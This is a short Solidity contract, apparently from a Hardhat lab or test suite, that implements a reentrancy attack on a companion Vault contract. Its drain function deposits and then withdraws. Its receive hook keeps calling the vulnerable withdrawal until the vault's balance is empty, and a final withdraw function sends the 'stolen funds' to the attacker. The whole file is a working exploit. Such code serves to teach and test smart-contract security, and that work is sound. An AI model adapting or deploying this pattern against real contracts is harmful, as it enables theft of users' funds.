// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Vault.sol";
import "hardhat/console.sol";

contract ReentrancyAttacker {
    Vault immutable targetContract;

    constructor(address targetContract_) {
        targetContract = Vault(targetContract_);
    }

    function drain() external payable {
        targetContract.deposit{value: msg.value}();
        targetContract.withdrawWithReentrancy();
    }

    receive() external payable {
        if (address(targetContract).balance > 0) {
            targetContract.withdrawWithReentrancy();
        }
    }

    // after attack finished the exploiter will withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
